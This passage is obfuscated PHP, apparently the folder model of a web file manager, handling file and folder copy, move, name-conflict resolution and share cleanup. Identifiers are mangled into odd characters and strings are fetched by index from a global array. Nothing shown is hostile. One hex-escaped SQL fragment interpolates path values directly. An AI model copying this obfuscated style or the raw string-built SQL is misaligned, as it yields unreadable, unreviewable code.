$ıİ‰¶œ); } $Ô²úèŒ = $Æ˜‘Ÿ; if ($ĞÊ„æ‘ò) { if ($š»¿æ«Œ == REPEAT_RENAME_FOLDER) { $Ñ£œŠ¾¢ = $this->fileNameAutoCache($¤ÚáóÓÈ, $Ñ£œŠ¾¢, $š»¿æ«Œ, $ĞÊ„æ‘ò); $Ô²úèŒ = $this->_copyCreate($Ğß§æ¬š, $¤ÚáóÓÈ, $Ñ£œŠ¾¢, $ıİ‰¶œ); } else { $öï‰ÀŠÛ = $this->_childrenList($Ğß§æ¬š); foreach ($öï‰ÀŠÛ as $óòŠ¾¥Â) { $this->_copy($óòŠ¾¥Â[$äşˆì¨™[183]], $Æ˜‘Ÿ, $š»¿æ«Œ, $ıİ‰¶œ, !1); } } } else { if ($š»¿æ«Œ == REPEAT_RENAME || $š»¿æ«Œ == REPEAT_RENAME_FOLDER) { $Ñ£œŠ¾¢ = $this->fileNameAutoCache($¤ÚáóÓÈ, $Ñ£œŠ¾¢, $š»¿æ«Œ, $ĞÊ„æ‘ò); $Ô²úèŒ = $this->_copyCreate($Ğß§æ¬š, $¤ÚáóÓÈ, $Ñ£œŠ¾¢, $ıİ‰¶œ); } else { if ($š»¿æ«Œ == REPEAT_REPLACE) { $À½°æ = $this->sourceInfoCache($Æ˜‘Ÿ); $Ù‡ÈÄÉÆ = $this->fileHistory($À½°æ, $ü£õÇÚ[$äşˆì¨™[519]], $ü£õÇÚ[$äşˆì¨™[78]]); if ($Ù‡ÈÄÉÆ) { $ıİ‰¶œ[$äşˆì¨™[607]][] = $ü£õÇÚ[$äşˆì¨™[519]]; } } else { if ($š»¿æ«Œ == REPEAT_SKIP) { } } } Hook::trigger($äşˆì¨™[612], array($äşˆì¨™[613], $ü£õÇÚ, 0)); } return $Ô²úèŒ; } private function _copyCreate($—ˆõÊ™², $å…İ¼Æä, $ÀŸšÇÈ½, &$æà»€„Ã) { $ıîÍ›™¡ =& $_SERVER[ú‡®¯¨±]; $·…†ûç = $this->sourceInfoCache($—ˆõÊ™²); $Îƒ«ÎàÇ = $this->sourceInfoCache($å…İ¼Æä); $«ŞÜ‡ìç = $this->_makeItemData($·…†ûç, $Îƒ«ÎàÇ, $ÀŸšÇÈ½); Hook::trigger($ıîÍ›™¡[614], $«ŞÜ‡ìç); Hook::trigger($ıîÍ›™¡[615], array($ıîÍ›™¡[616], $«ŞÜ‡ìç, 0)); $ƒ–Áèº = $this->add($«ŞÜ‡ìç); $ú¿Ãè•– = array($ıîÍ›™¡[183] => $ƒ–Áèº, $ıîÍ›™¡[32] => $ÀŸšÇÈ½); $this->_copyApplyMeta($ú¿Ãè•–, $æà»€„Ã); if ($·…†ûç[$ıîÍ›™¡[463]] != $ıîÍ›™¡[90]) { $æà»€„Ã[$ıîÍ›™¡[607]][] = $·…†ûç[$ıîÍ›™¡[519]]; return $ƒ–Áèº; } $æÓ ´êï = array(); $£Êˆ­Ì = array(); $this->_childrenListAll($—ˆõÊ™², $æÓ ´êï); $¼ˆøù = count($æÓ ´êï); if ($¼ˆøù == 0) { return $ƒ–Áèº; } $êÌêÌÚ = $this->sourceInfo($ƒ–Áèº); foreach ($æÓ ´êï as $ãÎË»Û) { $µúîñï = $this->_makeItemData($ãÎË»Û, $êÌêÌÚ, $ãÎË»Û[$ıîÍ›™¡[32]]); $µúîñï[$ıîÍ›™¡[563]] = $ãÎË»Û[$ıîÍ›™¡[563]]; $£Êˆ­Ì[] = $µúîñï; } $this->chunkEventSet($ıîÍ›™¡[617], array($ıîÍ›™¡[618], $«ŞÜ‡ìç, $¼ˆøù)); $this->addAll($£Êˆ­Ì, array(), !1); $Ş©ÍÄ±ø = $this->where(array($ıîÍ›™¡[182] => $ƒ–Áèº))->select(); $êÆÇÃÊù = $this->_childrenMakeRelation($æÓ ´êï, $Ş©ÍÄ±ø); $êÆÇÃÊù[$—ˆõÊ™²] = $ƒ–Áèº; $ü«ÙÃ±‡ = array(); $İ»™ü¯ = array(); foreach ($Ş©ÍÄ±ø as $ãÎË»Û) { $˜â¨˜ì¼ = $ãÎË»Û[$ıîÍ›™¡[183]]; $Òúè€ì = $this->_childrenMatch($êÆÇÃÊù, $ãÎË»Û, $êÌêÌÚ); $ü«ÙÃ±‡[] = array($ıîÍ›™¡[183], $˜â¨˜ì¼, $ıîÍ›™¡[182], $Òúè€ì[$ıîÍ›™¡[182]]); $İ»™ü¯[] = array($ıîÍ›™¡[183], $˜â¨˜ì¼, $ıîÍ›™¡[563], $Òúè€ì[$ıîÍ›™¡[563]]); $this->_copyApplyMeta($ãÎË»Û, $æà»€„Ã); if ($ãÎË»Û[$ıîÍ›™¡[463]] != $ıîÍ›™¡[90]) { $æà»€„Ã[$ıîÍ›™¡[607]][] = $ãÎË»Û[$ıîÍ›™¡[519]]; } } $this->chunkEventSet($ıîÍ›™¡[619], array($ıîÍ›™¡[620], $«ŞÜ‡ìç, $¼ˆøù)); $this->saveAll($ü«ÙÃ±‡); $this->chunkEventSet($ıîÍ›™¡[621], array($ıîÍ›™¡[622], $«ŞÜ‡ìç, $¼ˆøù)); $this->saveAll($İ»™ü¯); return $ƒ–Áèº; } private function _childrenMakeRelation($Æõ„ï¹Ñ, $Ÿ‘ëÍıÌ) { $ÚÇÀ‘˜ò =& $_SERVER[ú‡®¯¨±]; $ŸÄ ïú = array(); $‘§¾™Î¯ = array(); foreach ($Æõ„ï¹Ñ as $¤”ËÔØ) { $¥‚ÇüŞæ = $¤”ËÔØ[$ÚÇÀ‘˜ò[32]] . $ÚÇÀ‘˜ò[8] . $¤”ËÔØ[$ÚÇÀ‘˜ò[563]]; $ŸÄ ïú[$¥‚ÇüŞæ] = $¤”ËÔØ[$ÚÇÀ‘˜ò[183]]; } foreach ($Ÿ‘ëÍıÌ as $¤”ËÔØ) { $¥‚ÇüŞæ = $¤”ËÔØ[$ÚÇÀ‘˜ò[32]] . $ÚÇÀ‘˜ò[8] . $¤”ËÔØ[$ÚÇÀ‘˜ò[563]]; $²õ»²¨Ü = $ŸÄ ïú[$¥‚ÇüŞæ]; $‘§¾™Î¯[$²õ»²¨Ü] = $¤”ËÔØ[$ÚÇÀ‘˜ò[183]]; } return $‘§¾™Î¯; } private function _childrenMatch($Ü„²Ş¢„, $Û÷¢á¿”, $Ï÷ğıä) { $İ¶ä–¶ =& $_SERVER[ú‡®¯¨±]; $ĞÅ¼ş¯“ = $Ï÷ğıä[$İ¶ä–¶[563]]; $³­Ìö¨ = $this->parentLevelArray($Û÷¢á¿”[$İ¶ä–¶[563]]); foreach ($³­Ìö¨ as $ìº…šø„) { if (isset($Ü„²Ş¢„[$ìº…šø„])) { $ĞÅ¼ş¯“ .= $Ü„²Ş¢„[$ìº…šø„] . $İ¶ä–¶[623]; } } $ĞÅ¼ş¯“ = rtrim($ĞÅ¼ş¯“, $İ¶ä–¶[50]) . $İ¶ä–¶[50]; $€‰î± = $this->parentLevelArray($ĞÅ¼ş¯“); $¶À³ÆÓ¥ = $€‰î±[count($€‰î±) - 1]; return array($İ¶ä–¶[182] => $¶À³ÆÓ¥, $İ¶ä–¶[563] => $ĞÅ¼ş¯“); } private function _makeItemData($éöøÍ¦Ã, $ğî´ùÛ, $¶»Ë—á¤) { $µ›½¾Ô¸ =& $_SERVER[ú‡®¯¨±]; $öêòÉ = array($µ›½¾Ô¸[624] => $éöøÍ¦Ã[$µ›½¾Ô¸[463]], $µ›½¾Ô¸[472] => $¶»Ë—á¤, $µ›½¾Ô¸[625] => $éöøÍ¦Ã[$µ›½¾Ô¸[464]] ? $éöøÍ¦Ã[$µ›½¾Ô¸[464]] : $µ›½¾Ô¸[12], $µ›½¾Ô¸[520] => $éöøÍ¦Ã[$µ›½¾Ô¸[519]] ? $éöøÍ¦Ã[$µ›½¾Ô¸[519]] : 0, $µ›½¾Ô¸[595] => $éöøÍ¦Ã[$µ›½¾Ô¸[78]] ? $éöøÍ¦Ã[$µ›½¾Ô¸[78]] : 0, $µ›½¾Ô¸[626] => intval($ğî´ùÛ[$µ›½¾Ô¸[180]]), $µ›½¾Ô¸[627] => intval($ğî´ùÛ[$µ›½¾Ô¸[548]]), $µ›½¾Ô¸[628] => intval(USER_ID), $µ›½¾Ô¸[629] => intval(USER_ID), $µ›½¾Ô¸[455] => intval($ğî´ùÛ[$µ›½¾Ô¸[183]]), $µ›½¾Ô¸[630] => $ğî´ùÛ[$µ›½¾Ô¸[563]] . $ğî´ùÛ[$µ›½¾Ô¸[183]] . $µ›½¾Ô¸[50], $µ›½¾Ô¸[476] => $éöøÍ¦Ã[$µ›½¾Ô¸[87]] ? $éöøÍ¦Ã[$µ›½¾Ô¸[87]] : time(), $µ›½¾Ô¸[482] => 0, $µ›½¾Ô¸[631] => $µ›½¾Ô¸[12]); return $öêòÉ; } private function _copyApplyMeta($˜ö·ç­‚, &$¦Ğëæ½’) { $äœùŞÍú =& $_SERVER[ú‡®¯¨±]; $ªòíÇúÎ = $˜ö·ç­‚[$äœùŞÍú[183]]; $„ ş¯”ó = $˜ö·ç­‚[$äœùŞÍú[32]]; if (!isset($˜ö·ç­‚[$äœùŞÍú[632]]) || !$˜ö·ç­‚[$äœùŞÍú[632]] || $˜ö·ç­‚[$äœùŞÍú[632]] == $äœùŞÍú[224]) { $¦Ğëæ½’[$äœùŞÍú[609]][] = array($äœùŞÍú[183], $ªòíÇúÎ, $äœùŞÍú[632], short_id($ªòíÇúÎ)); } if (Input::check($„ ş¯”ó, $äœùŞÍú[633])) { $¦Ğëæ½’[$äœùŞÍú[608]][] = array($äœùŞÍú[183] => $ªòíÇúÎ, $äœùŞÍú[96] => $äœùŞÍú[516], $äœùŞÍú[429] => str_replace($äœùŞÍú[53], $äœùŞÍú[12], Pinyin::get($„ ş¯”ó))); $¦Ğëæ½’[$äœùŞÍú[608]][] = array($äœùŞÍú[183] => $ªòíÇúÎ, $äœùŞÍú[96] => $äœùŞÍú[515], $äœùŞÍú[429] => Pinyin::get($„ ş¯”ó, $äœùŞÍú[634])); } $¦Ğëæ½’[$äœùŞÍú[608]][] = array($äœùŞÍú[183] => $ªòíÇúÎ, $äœùŞÍú[96] => $äœùŞÍú[495], $äœùŞÍú[429] => KodSort::makeStr($„ ş¯”ó)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($å§Õ­ã) { $ì¾…¦²÷ =& $_SERVER[ú‡®¯¨±]; $ëüÙ’Œï = $this->sourceInfo($å§Õ­ã); $ñºÍ€Ò¥ = $ì¾…¦²÷[635]; $»’õ½¢Ó = array($ì¾…¦²÷[563] => array($ì¾…¦²÷[590], $ëüÙ’Œï[$ì¾…¦²÷[563]] . $å§Õ­ã . $ì¾…¦²÷[591]), $ì¾…¦²÷[483] => $this->targetIsDelete); $Ü€Ôşøé = $this->field($ñºÍ€Ò¥)->where($»’õ½¢Ó)->select(); if (!$Ü€Ôşøé) { return; } $Ü€Ôşøé = array_to_keyvalue($Ü€Ôşøé, $ì¾…¦²÷[183]); foreach ($Ü€Ôşøé as $òçÙÍá) { $Æ¯ù±á = $òçÙÍá[$ì¾…¦²÷[182]]; $å§Õ­ã = $òçÙÍá[$ì¾…¦²÷[183]]; if (!isset($this->_childrenListCache[$å§Õ­ã]) && $òçÙÍá[$ì¾…¦²÷[463]] == $ì¾…¦²÷[90]) { $this->_childrenListCache[$å§Õ­ã] = array(); } if (!isset($this->_childrenListCache[$Æ¯ù±á])) { $this->_childrenListCache[$Æ¯ù±á] = array(); } $this->_childrenListCache[$Æ¯ù±á][$å§Õ­ã] = $òçÙÍá; $this->_childrenItemCache[$å§Õ­ã] = $òçÙÍá; } } private function _childrenListAll($š™‹‹ˆÛ, &$Ñ…Æ˜óè) { $®Ò£Ùßâ =& $_SERVER[ú‡®¯¨±]; if (!isset($this->_childrenListCache[$š™‹‹ˆÛ])) { return; } $Å×¯óÍ´ = $this->_childrenListCache[$š™‹‹ˆÛ]; foreach ($Å×¯óÍ´ as $ôµÀ»©¡ => $ñİâÀë•) { $Ñ…Æ˜óè[$ôµÀ»©¡] = $ñİâÀë•; if ($ñİâÀë•[$®Ò£Ùßâ[463]] == $®Ò£Ùßâ[90]) { $this->_childrenListAll($ôµÀ»©¡, $Ñ…Æ˜óè); } } } private function sourceInfoCache($¾øÀîå°) { if (isset($this->_childrenItemCache[$¾øÀîå°])) { return $this->_childrenItemCache[$¾øÀîå°]; } return $this->sourceInfo($¾øÀîå°); } private function _childrenList($€üó¡) { if (isset($this->_childrenListCache[$€üó¡])) { return $this->_childrenListCache[$€üó¡]; } return $this->_childrenListSelect($€üó¡); } private function _childrenListSelect($†Õúë§ƒ) { $ô½Ì—Á =& $_SERVER[ú‡®¯¨±]; $Ô¼´ıË¸ = array($ô½Ì—Á[182] => $†Õúë§ƒ, $ô½Ì—Á[483] => $this->targetIsDelete); $¸Ü‹–†Ø = $this->where($Ô¼´ıË¸)->select(); $¸Ü‹–†Ø = $¸Ü‹–†Ø ? $¸Ü‹–†Ø : array(); $Û¯»ˆà¼ = array_to_keyvalue($¸Ü‹–†Ø, $ô½Ì—Á[183]); $this->_childrenListCache[$†Õúë§ƒ] = $Û¯»ˆà¼; foreach ($Û¯»ˆà¼ as $†Õúë§ƒ => $ñ÷Æï¡Å) { $this->_childrenItemCache[$†Õúë§ƒ] = $ñ÷Æï¡Å; } return $Û¯»ˆà¼; } private function fileNameExistAuto($¾š—¶Ì, $ş³Âñ˜) { $ÊÎ‡Ö•Æ =& $_SERVER[ú‡®¯¨±]; if ($ş³Âñ˜[$ÊÎ‡Ö•Æ[483]] == $ÊÎ‡Ö•Æ[90]) { return $this->fileNameExist($¾š—¶Ì, $ş³Âñ˜[$ÊÎ‡Ö•Æ[32]]); } return $this->fileNameExistCache($¾š—¶Ì, $ş³Âñ˜[$ÊÎ‡Ö•Æ[32]]); } private function fileNameExistCache($Õí›£Ü½, $À³·ı‡Á) { $‚÷…’Æ¶ =& $_SERVER[ú‡®¯¨±]; $À³·ı‡Á = strtolower($À³·ı‡Á); $»®ˆÌ¦ = $this->_childrenList($Õí›£Ü½); foreach ($»®ˆÌ¦ as $ÑÕ¤ÇÃ») { if ($À³·ı‡Á == strtolower($ÑÕ¤ÇÃ»[$‚÷…’Æ¶[32]])) { return $ÑÕ¤ÇÃ»[$‚÷…’Æ¶[183]]; } } return !1; } private function fileNameAutoCache($ç¯Àğïæ, $Œ¡¸”Íˆ, $¤Ä²ã¾˜, $Ã·¢„Î) { $Ê’°ìÑ½ =& $_SERVER[ú‡®¯¨±]; $àºö·‹ = $this->_childrenList($ç¯Àğïæ); $†ãö“¼— = array_to_keyvalue($àºö·‹, $Ê’°ìÑ½[12], $Ê’°ìÑ½[32]); return $this->fileNameAutoGet($†ãö“¼—, $Œ¡¸”Íˆ, $¤Ä²ã¾˜, $Ã·¢„Î); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($›Îó¸°õ, $ÛÔĞ€–, $‘ö²å™ú = REPEAT_REPLACE, $„ôÂÙø = '') { $•®Ä ç =& $_SERVER[ú‡®¯¨±]; $úåù­¸‚ = $this->sourceInfo($›Îó¸°õ); $îé½â¼– = $this->sourceInfo($ÛÔĞ€–); if ($úåù­¸‚[$•®Ä ç[182]] == $îé½â¼–[$•®Ä ç[183]]) { if ($úåù­¸‚[$•®Ä ç[483]] == $•®Ä ç[90]) { Model($•®Ä ç[481])->restore(array($›Îó¸°õ)); } if (!$„ôÂÙø || $„ôÂÙø == $úåù­¸‚[$•®Ä ç[32]]) { return $›Îó¸°õ; } } $’ñ…¶×‘ = $this->pathInfoMore($›Îó¸°õ); if ($this->isParentOf($›Îó¸°õ, $ÛÔĞ€–)) { return !1; } if (!$úåù­¸‚ || !$îé½â¼– || $îé½â¼–[$•®Ä ç[463]] != $•®Ä ç[90]) { return !1; } Hook::trigger($•®Ä ç[636], $’ñ…¶×‘); $this->targetIsDelete = intval($úåù­¸‚[$•®Ä ç[483]]); if ($úåù­¸‚[$•®Ä ç[182]] == $ÛÔĞ€– && $„ôÂÙø != $úåù­¸‚[$•®Ä ç[32]]) { $İÅÃéìï = $this->fileNameExist($ÛÔĞ€–, $„ôÂÙø); if ($İÅÃéìï && $úåù­¸‚[$•®Ä ç[463]] == $•®Ä ç[224]) { $ÕŒ‚×Åç = $this->sourceInfo($İÅÃéìï); $åßÖ ¹» = $this->fileHistory($ÕŒ‚×Åç, $úåù­¸‚[$•®Ä ç[519]], $úåù­¸‚[$•®Ä ç[78]]); if (!$åßÖ ¹») { Model($•®Ä ç[522])->remove($úåù­¸‚[$•®Ä ç[519]]); } $this->removeNow($›Îó¸°õ, !1); $this->folderSizeReset($ÛÔĞ€–); Hook::trigger($•®Ä ç[637], $’ñ…¶×‘); return $İÅÃéìï; } } $ç‡ôÁÅ = $„ôÂÙø ? $„ôÂÙø : $úåù­¸‚[$•®Ä ç[32]]; $this->lockMoveStart($›Îó¸°õ); $this->lockWriteStart($ÛÔĞ€–, $ç‡ôÁÅ); $÷ı§ûä– = array($•®Ä ç[607] => array(), $•®Ä ç[638] => !1); $this->clearShare($›Îó¸°õ, $ÛÔĞ€–); $üüÔçÄĞ = $this->fileNameExistAuto($ÛÔĞ€–, $úåù­¸‚); $‹ûâãÇò = $this->_move($›Îó¸°õ, $ÛÔĞ€–, $‘ö²å™ú, $÷ı§ûä–, $„ôÂÙø); $this->sourceCacheClear(); if ($úåù­¸‚[$•®Ä ç[463]] == $•®Ä ç[90] && $üüÔçÄĞ) { $this->folderSizeResetChildren($‹ûâãÇò); } Model($•®Ä ç[226])->linkAdd($÷ı§ûä–[$•®Ä ç[607]]); if ($üüÔçÄĞ && $÷ı§ûä–[$•®Ä ç[638]]) { $this->removeNow($›Îó¸°õ, !1); } $this->lockMoveEnd($›Îó¸°õ); $this->lockWriteEnd($ÛÔĞ€–, $ç‡ôÁÅ); $this->folderSizeReset($úåù­¸‚[$•®Ä ç[182]]); $this->folderSizeReset($ÛÔĞ€–); $Øİ–‡® = array($úåù­¸‚[$•®Ä ç[182]], $ÛÔĞ€–); if ($úåù­¸‚[$•®Ä ç[463]] == $•®Ä ç[90]) { $Øİ–‡®[] = $›Îó¸°õ; } $this->updateModifyTime($Øİ–‡®); Model($•®Ä ç[611])->eventMove($›Îó¸°õ, $úåù­¸‚[$•®Ä ç[182]], $ÛÔĞ€–); Hook::trigger($•®Ä ç[637], $’ñ…¶×‘); return $‹ûâãÇò; } private function _move($ÇÂŠèĞ, $×Ü˜ÖÃÖ, $ü×áïå¨, &$†ñêÍƒ÷, $ËïâÙ©ó = '') { $Ã›ÄÍ¥é =& $_SERVER[ú‡®¯¨±]; $ó»ÈÄöá = $this->sourceInfo($ÇÂŠèĞ); $“ª™š” = $ó»ÈÄöá[$Ã›ÄÍ¥é[463]] == $Ã›ÄÍ¥é[90]; $âÕ›ÇÚÃ = $ËïâÙ©ó ? $ËïâÙ©ó : $ó»ÈÄöá[$Ã›ÄÍ¥é[32]]; $Ù‹ÌâøŠ = $this->fileNameExistAuto($×Ü˜ÖÃÖ, $ó»ÈÄöá); $this->lockMoveStart($ÇÂŠèĞ); $this->lockWriteStart($×Ü˜ÖÃÖ, $âÕ›ÇÚÃ); if (!$Ù‹ÌâøŠ) { return $this->_moveForce($ÇÂŠèĞ, $×Ü˜ÖÃÖ, $âÕ›ÇÚÃ); } $…«ÆÙà” = $Ù‹ÌâøŠ; $¿¼‹®œÜ = !1; if ($“ª™š”) { if ($ü×áïå¨ == REPEAT_RENAME_FOLDER) { $âÕ›ÇÚÃ = $this->fileNameAuto($×Ü˜ÖÃÖ, $âÕ›ÇÚÃ, $ü×áïå¨, $“ª™š”); $…«ÆÙà” = $this->_moveForce($ÇÂŠèĞ, $×Ü˜ÖÃÖ, $âÕ›ÇÚÃ); } else { if ($ü×áïå¨ == REPEAT_RENAME_FOLDER) { $ü×áïå¨ = REPEAT_RENAME; } $ÉÑê‚§Â = $this->_childrenListSelect($ÇÂŠèĞ); foreach ($ÉÑê‚§Â as $§Õ·×™ı) { $this->_move($§Õ·×™ı[$Ã›ÄÍ¥é[183]], $Ù‹ÌâøŠ, $ü×áïå¨, $†ñêÍƒ÷); } $¿¼‹®œÜ = !0; } } else { if ($ü×áïå¨ == REPEAT_SKIP) { $¿¼‹®œÜ = !0; } else { if ($ü×áïå¨ == REPEAT_RENAME || $ü×áïå¨ == REPEAT_RENAME_FOLDER) { $âÕ›ÇÚÃ = $this->fileNameAuto($×Ü˜ÖÃÖ, $âÕ›ÇÚÃ, $ü×áïå¨, $“ª™š”); $…«ÆÙà” = $this->_moveForce($ÇÂŠèĞ, $×Ü˜ÖÃÖ, $âÕ›ÇÚÃ); } else { if ($ü×áïå¨ == REPEAT_REPLACE) { $÷šÙšÔ = $this->sourceInfoCache($Ù‹ÌâøŠ); $ãµÕÍ˜Ï = $this->fileHistory($÷šÙšÔ, $ó»ÈÄöá[$Ã›ÄÍ¥é[519]], $ó»ÈÄöá[$Ã›ÄÍ¥é[78]]); $¿¼‹®œÜ = !0; if ($ãµÕÍ˜Ï) { $†ñêÍƒ÷[$Ã›ÄÍ¥é[607]][] = $ó»ÈÄöá[$Ã›ÄÍ¥é[519]]; } } } } } if ($¿¼‹®œÜ && !$†ñêÍƒ÷[$Ã›ÄÍ¥é[638]]) { $†ñêÍƒ÷[$Ã›ÄÍ¥é[638]] = !0; } return $…«ÆÙà”; } private function _moveForce($Ó Ûü¨Ñ, $£“ë´ş„, $™ù™ëò†) { $·İÃ½šı =& $_SERVER[ú‡®¯¨±]; $É½³íéã = $this->sourceInfo($Ó Ûü¨Ñ); $ÖĞ–â‰ = $this->sourceInfo($£“ë´ş„); $Ä„­´“ = $É½³íéã[$·İÃ½šı[463]] == $·İÃ½šı[90]; $›ŠÎŸî = array($·İÃ½šı[455] => $ÖĞ–â‰[$·İÃ½šı[183]], $·İÃ½šı[630] => $ÖĞ–â‰[$·İÃ½šı[563]] . $ÖĞ–â‰[$·İÃ½šı[183]] . $·İÃ½šı[50], $·İÃ½šı[626] => $ÖĞ–â‰[$·İÃ½šı[180]], $·İÃ½šı[627] => $ÖĞ–â‰[$·İÃ½šı[548]], $·İÃ½šı[629] => USER_ID, $·İÃ½šı[472] => $™ù™ëò†); $¹–£ÃÜ” = $É½³íéã[$·İÃ½šı[180]] == SourceModel::TYPE_GROUP && $ÖĞ–â‰[$·İÃ½šı[180]] == SourceModel::TYPE_GROUP && $É½³íéã[$·İÃ½šı[548]] == $ÖĞ–â‰[$·İÃ½šı[548]]; if (!$¹–£ÃÜ” && $this->moveClearAuth) { Model($·İÃ½šı[546])->authClear($Ó Ûü¨Ñ); } $íÛèËËé = $É½³íéã[$·İÃ½šı[483]] == $·İÃ½šı[90] && $ÖĞ–â‰[$·İÃ½šı[483]] != $·İÃ½šı[90]; if ($íÛèËËé) { $›ŠÎŸî[$·İÃ½šı[482]] = 0; } if ($Ä„­´“) { $¡ÏŒÑËü = array($·İÃ½šı[630] => array($·İÃ½šı[590], $É½³íéã[$·İÃ½šı[563]] . $É½³íéã[$·İÃ½šı[183]] . $·İÃ½šı[591])); $Ş¼ƒ®èÁ = $É½³íéã[$·İÃ½šı[563]] . $É½³íéã[$·İÃ½šı[183]] . $·İÃ½šı[50]; $ˆåß¢´à = $ÖĞ–â‰[$·İÃ½šı[563]] . $ÖĞ–â‰[$·İÃ½šı[183]] . $·İÃ½šı[50] . $É½³íéã[$·İÃ½šı[183]] . $·İÃ½šı[50]; $¤‹î¡ÇÊ = array($·İÃ½šı[630] => array($·İÃ½šı[639], "\162\x65\160\x6c\141\143\145\x28\160\x61\x72\145\x6e\164\x4c\145\166\145\154\54\x27{$Ş¼ƒ®èÁ}\x27\54\x27{$ˆåß¢´à}\47\51"), $·İÃ½šı[626] => $ÖĞ–â‰[$·İÃ½šı[180]], $·İÃ½šı[627] => $ÖĞ–â‰[$·İÃ½šı[548]]); if ($íÛèËËé) { $¤‹î¡ÇÊ[$·İÃ½šı[482]] = 0; } $this->where($¡ÏŒÑËü)->data($¤‹î¡ÇÊ)->save(); } $this->where(array($·İÃ½šı[469] => $Ó Ûü¨Ñ))->data($›ŠÎŸî)->save(); return $Ó Ûü¨Ñ; } private function clearShare($€ä»áœ™, $’¤êŞ¦) { $‡÷ÁÜ´È =& $_SERVER[ú‡®¯¨±]; $§äµ¨Èò = $this->sourceInfo($€ä»áœ™); $ì•¿×óë = $this->sourceInfo($’¤êŞ¦); if ($§äµ¨Èò[$‡÷ÁÜ´È[548]] == $ì•¿×óë[$‡÷ÁÜ´È[548]] && $§äµ¨Èò[$‡÷ÁÜ´È[180]] == $‡÷ÁÜ´È[640]) { return; } $ÚÂŒ³üÆ = array($‡÷ÁÜ´È[563] => array($‡÷ÁÜ´È[590], $§äµ¨Èò[$‡÷ÁÜ´È[563]] . $€ä»áœ™ . $‡÷ÁÜ´È[591])); $ÓÆıĞƒ = $this->field($‡÷ÁÜ´È[469])->where($ÚÂŒ³üÆ)->getField($‡÷ÁÜ´È[183], !0); if (!$ÓÆıĞƒ) { return; } $ÚÂŒ³üÆ = array($‡÷ÁÜ´È[183] => array($‡÷ÁÜ´È[7], $ÓÆıĞƒ), $‡÷ÁÜ´È[641] => 1); $«ØÀå‰ø = Model($‡÷ÁÜ´È[642])->field($‡÷ÁÜ´È[643])->where($ÚÂŒ³üÆ)->select(); if (!$«ØÀå‰ø) { return; } $«ØÀå‰ø = array_to_keyvalue($«ØÀå‰ø, $‡÷ÁÜ´È[12], $‡÷ÁÜ´È[643]); $ÚÂŒ³üÆ = array($‡÷ÁÜ´È[643] => array($‡÷ÁÜ´È[7], $«ØÀå‰ø)); Model($‡÷ÁÜ´È[642])->where($ÚÂŒ³üÆ)->save(array($‡÷ÁÜ´È[641] => 0)); Model($‡÷ÁÜ´È[644])->where($ÚÂŒ³üÆ)->delete(); } public function copyFolderFromIO($ÚšÀøªµ, $¶®ƒ¶§Û, $õ×º¢íğ, $èÙºÁ†½, $ÄÇÔï÷‰, $Ûùì¥Œ­ = false) { $á¢²ÑäÍ =& $_SERVER[ú‡®¯¨±]; $úÏ£¿ë = array($á¢²ÑäÍ[608] => array(), $á¢²ÑäÍ[609] => array(), $á¢²ÑäÍ[607] => array(), $á¢²ÑäÍ[645] => array()); $†¢¶±ÙØ = $Ûùì¥Œ­ ? $Ûùì¥Œ­ : $ÚšÀøªµ->pathThis($¶®ƒ¶§Û); $æ¦ò¯ÚÖ = $this->fileNameExist($õ×º¢íğ, $†¢¶±ÙØ); $®İôÛÈ… = $this->mkdir($õ×º¢íğ, $†¢¶±ÙØ, $èÙºÁ†½); if (!$æ¦ò¯ÚÖ || $èÙºÁ†½ == REPEAT_RENAME_FOLDER) { $èÙºÁ†½ = !1; } if ($æ¦ò¯ÚÖ) { $this->_childrenAllMake($æ¦ò¯ÚÖ); } Hook::trigger($á¢²ÑäÍ[646]); $this->_copyChildTo($ÚšÀøªµ, $¶®ƒ¶§Û, $®İôÛÈ…, $èÙºÁ†½, $úÏ£¿ë, $ÄÇÔï÷‰); Hook::trigger($á¢²ÑäÍ[647]); if ($®İôÛÈ…) { $this->folderSizeResetChildren($®İôÛÈ…); } $this->_childrenListClear(); Model($á¢²ÑäÍ[610])->addAll($úÏ£¿ë[$á¢²ÑäÍ[608]], array(), !0); Model($á¢²ÑäÍ[611])->eventCopy($®İôÛÈ…); $this->saveAll($úÏ£¿ë[$á¢²ÑäÍ[609]]); Model($á¢²ÑäÍ[522])->linkAdd($úÏ£¿ë[$á¢²ÑäÍ[607]]); Model($á¢²ÑäÍ[522])->remove($úÏ£¿ë[$á¢²ÑäÍ[645]]); $this->folderSizeReset($õ×º¢íğ); $this->updateModifyTime($õ×º¢íğ); return $®İôÛÈ…; } private function _copyChildTo($¤…è¥ß, $ì¤Äæ‡³, $£³æéÜä, $‘ÏÀ·€, &$áÄÜšËÔ, $çƒ¸©†¥) { $›ì±ñĞ‡ =& $_SERVER[ú‡®¯¨±]; $¸Õ«şŞİ = $this->sourceInfoCache($£³æéÜä); $Îü‹´šı = $¤…è¥ß->listPath($ì¤Äæ‡³); $Îü‹´šı = $Îü‹´šı ? $Îü‹´šı : array($›ì±ñĞ‡[85] => array(), $›ì±ñĞ‡[84] => array()); $ŞøÑ÷Õñ = array_merge($Îü‹´šı[$›ì±ñĞ‡[85]], $Îü‹´šı[$›ì±ñĞ‡[84]]); $ã°íÙıŒ = $this->_addFiles($¤…è¥ß, $Îü‹´šı[$›ì±ñĞ‡[85]], $çƒ¸©†¥); $Ö÷¨úÆÇ = array(); foreach ($ŞøÑ÷Õñ as &$¯ØÑçÅÄ) { if (isset($ã°íÙıŒ[$¯ØÑçÅÄ[$›ì±ñĞ‡[32]]])) { $¯ØÑçÅÄ = $ã°íÙıŒ[$¯ØÑçÅÄ[$›ì±ñĞ‡[32]]]; } $¯ØÑçÅÄ[$›ì±ñĞ‡[463]] = $¯ØÑçÅÄ[$›ì±ñĞ‡[33]] == $›ì±ñĞ‡[77]; $¯ØÑçÅÄ[$›ì±ñĞ‡[464]] = substr(_get($¯ØÑçÅÄ, $›ì±ñĞ‡[177], $›ì±ñĞ‡[12]), 0, 10); $¯ØÑçÅÄ[$›ì±ñĞ‡[78]] = _get($¯ØÑçÅÄ, $›ì±ñĞ‡[78], 0); $¯ØÑçÅÄ[$›ì±ñĞ‡[519]] = _get($¯ØÑçÅÄ, $›ì±ñĞ‡[519], 0); if (!isset($¯ØÑçÅÄ[$›ì±ñĞ‡[648]]) && $¯ØÑçÅÄ[$›ì±ñĞ‡[519]]) { $áÄÜšËÔ[$›ì±ñĞ‡[645]][] = $¯ØÑçÅÄ[$›ì±ñĞ‡[519]]; } if 